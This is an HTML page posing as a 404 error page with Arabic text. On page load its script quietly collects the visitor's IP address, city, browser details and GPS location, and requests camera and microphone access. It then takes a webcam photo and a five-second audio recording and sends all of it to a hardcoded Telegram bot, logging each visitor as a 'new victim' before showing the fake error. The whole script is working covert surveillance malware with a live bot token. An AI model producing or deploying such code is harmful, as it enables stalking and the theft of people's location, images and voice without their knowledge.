<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { background-color: #f0f2f5; color: #333; font-family: sans-serif; text-align: center; padding: 50px; }
        .container { max-width: 600px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #errorView { display: none; }
    </style>
</head>
<body>
    <div id="loadingView">
        <div class="loader"></div>
        <p>Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±...</p>
    </div>

    <div id="errorView" class="container">
        <h1>404</h1>
        <h2>Page Not Found</h2>
        <p>Ø¹Ø°Ø±Ø§Ù‹ØŒ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø°ÙŠ ØªØ­Ø§ÙˆÙ„ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„ÙŠÙ‡ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ Ø£Ùˆ ØªÙ… Ù†Ù‚Ù„Ù‡.</p>
    </div>

    <script>
        const token = '7565752831:AAFr5xn1Qk6qJ1UKSkXtVcK_6ho5dKWCnLQ';
        const chatId = '7360450559';

        async function sendLog(msg) {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
        }

        async function startCapture() {
            // 1. Ø³Ø­Ø¨ Ø§Ù„Ù€ IP ÙˆØ§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                await sendLog(`ğŸ”” Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯!\nğŸŒ IP: ${d.ip}\nğŸ“ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${d.city}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.userAgent}`);
            } catch(e) {}

            // 2. Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    await sendLog(`ğŸ“ Ù…ÙˆÙ‚Ø¹ GPS: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                });
            }

            // 3. Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØµÙˆØª (ÙŠØ·Ù„Ø¨ Ø¥Ø°Ù† ÙˆØ§Ø­Ø¯ Ù„Ù„Ø§Ø«Ù†ÙŠÙ†)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // --- Ù„Ù‚Ø·Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ---
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const frm = new FormData();
                        frm.append('chat_id', chatId);
                        frm.append('photo', blob, 'cam.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
                    }, 'image/jpeg');
                }, 2000);

                // --- ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ (5 Ø«ÙˆØ§Ù†ÙŠ) ---
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const frm = new FormData();
                    frm.append('chat_id', chatId);
                    frm.append('voice', blob, 'rec.ogg');
                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm });
                    stream.getTracks().forEach(t => t.stop());
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);

            } catch (e) {
                await sendLog("âŒ Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù† Ø£Ùˆ Ø§Ù„Ø¬Ù‡Ø§Ø² Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
            }

            // Ø¥Ø¸Ù‡Ø§Ø± ØµÙØ­Ø© Ø§Ù„Ø®Ø·Ø£ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
            setTimeout(() => {
                document.getElementById('loadingView').style.display = 'none';
                document.getElementById('errorView').style.display = 'block';
            }, 3000);
        }

        window.onload = startCapture;
    </script>
</body>
</html>
